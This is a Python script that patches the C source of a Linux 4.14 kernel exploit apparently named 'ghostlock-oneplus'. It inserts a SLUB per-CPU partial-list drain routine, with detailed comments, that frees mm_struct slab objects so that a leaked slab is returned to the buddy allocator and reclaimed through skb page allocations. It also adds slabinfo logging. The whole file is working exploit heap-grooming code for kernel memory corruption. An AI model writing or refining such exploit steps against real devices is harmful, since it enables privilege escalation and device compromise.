import sys

common = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
util = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"

# ---- common.h: add MM_SLUB_DRAIN_SLABS ----
s = open(common).read()
anchor = "#define MM_PARTIALS 5\n"
assert s.count(anchor) == 1, ("MM_PARTIALS anchor", s.count(anchor))
if "MM_SLUB_DRAIN_SLABS" not in s:
    s = s.replace(anchor, anchor + "\n"
        "/* 4.14 SLUB: mm_cache s->size=896 => cpu_partial=13 objects (see\n"
        " * set_cpu_partial() in mm/slub.c), so put_cpu_partial() only runs\n"
        " * unfreeze_partials() once pobjects>13.  A full slab frozen by its first\n"
        " * free stays on the per-CPU partial list until then.  Free the first\n"
        " * object of MM_SLUB_DRAIN_SLABS additional full slabs to force the drain\n"
        " * before child_leak's mm is freed (port of the 4.14 <=1024B bucket). */\n"
        "#define MM_SLUB_DRAIN_SLABS 20\n")
    open(common, "w").write(s)
    print("common.h patched")
else:
    print("common.h already patched")

u = open(util).read()
if "mm_slab_num_slabs" not in u:
    helper = (
        "static long mm_slab_num_slabs(void) {\n"
        "  FILE *f = fopen(\"/proc/slabinfo\", \"r\");\n"
        "  if (!f) return -1;\n"
        "  char line[512];\n"
        "  long total = -1;\n"
        "  while (fgets(line, sizeof(line), f)) {\n"
        "    if (strncmp(line, \"mm_struct \", 10) != 0) continue;\n"
        "    char *p = strstr(line, \"slabdata\");\n"
        "    if (p) { long active = -1; sscanf(p + 8, \"%ld %ld\", &active, &total); }\n"
        "    break;\n"
        "  }\n"
        "  fclose(f);\n"
        "  return total;\n"
        "}\n\n"
    )
    anchor = "uintptr_t prepare_kernel_page(int payload_mode) {"
    assert u.count(anchor) == 1, ("prepare_kernel_page anchor", u.count(anchor))
    u = u.replace(anchor, helper + anchor)
    print("helper added")

    anchor = "  SYSCHK(close(memfd_leak));\n  memfd_leak = -1;\n"
    assert u.count(anchor) == 1, ("close memfd_leak anchor", u.count(anchor))
    drain = (
        "  /* --- 4.14 SLUB per-CPU partial drain (option C) -----------------------\n"
        "   * __slab_free() freezes a full slab on its first free and leaves it on\n"
        "   * the per-CPU partial list; freeing its last object while frozen does\n"
        "   * NOT discard it, so the skb frag's alloc_pages(order 3) never reuses\n"
        "   * `base`.  put_cpu_partial() runs unfreeze_partials() only when\n"
        "   * pobjects>cpu_partial.  mm_cache has s->size=896 => cpu_partial=13,\n"
        "   * but pre+spray freeze only ~7 slabs.  Free the first object of\n"
        "   * MM_SLUB_DRAIN_SLABS more full prepare_ctx slabs first: this crosses\n"
        "   * the threshold BEFORE child_leak's mm is freed, so the leak slab is\n"
        "   * moved off the per-CPU list (unfrozen) and its last free then reaches\n"
        "   * discard_slab() -> buddy. */\n"
        "  pr_info(\"SLUB drain: mm_slabs before=%ld\\n\", mm_slab_num_slabs());\n"
        "  for (size_t i = 0; i < MM_SLUB_DRAIN_SLABS; i++) {\n"
        "    size_t idx = i * mm_objs_per_slab;   /* first object of slab i */\n"
        "    if (idx >= prepare_ctx.mm_cnt) break;\n"
        "    if (prepare_ctx.memfds[idx] > 0) {\n"
        "      SYSCHK(close(prepare_ctx.memfds[idx]));\n"
        "      prepare_ctx.memfds[idx] = -1;\n"
        "    }\n"
        "    kill_child(prepare_ctx.childs[idx]);\n"
        "    prepare_ctx.childs[idx] = 0;\n"
        "  }\n"
        "  pr_info(\"SLUB drain: mm_slabs after churn=%ld\\n\", mm_slab_num_slabs());\n"
    )
    u = u.replace(anchor, drain + anchor)
    print("drain inserted")

    anchor2 = ("  SYSCHK(close(memfd_leak));\n  memfd_leak = -1;\n"
               "  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {")
    assert u.count(anchor2) == 1, ("leak+reclaim anchor", u.count(anchor2))
    u = u.replace(anchor2,
        "  SYSCHK(close(memfd_leak));\n  memfd_leak = -1;\n"
        "  pr_info(\"SLUB drain: mm_slabs after leak free=%ld\\n\", mm_slab_num_slabs());\n"
        "  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {")
    print("leak-free log added")

    anchor3 = ("  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {\n"
               "    SYSCHK(close(prepare_ctx.memfds[i]));\n"
               "    prepare_ctx.memfds[i] = -1;\n"
               "    kill_child(prepare_ctx.childs[i]);\n"
               "  }")
    assert u.count(anchor3) == 1, ("end-loop anchor", u.count(anchor3))
    u = u.replace(anchor3,
        "  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {\n"
        "    if (prepare_ctx.memfds[i] > 0) {\n"
        "      SYSCHK(close(prepare_ctx.memfds[i]));\n"
        "      prepare_ctx.memfds[i] = -1;\n"
        "    }\n"
        "    kill_child(prepare_ctx.childs[i]);\n"
        "  }")
    print("end-loop guarded")
    open(util, "w").write(u)
else:
    print("util.c already patched")
print("done")
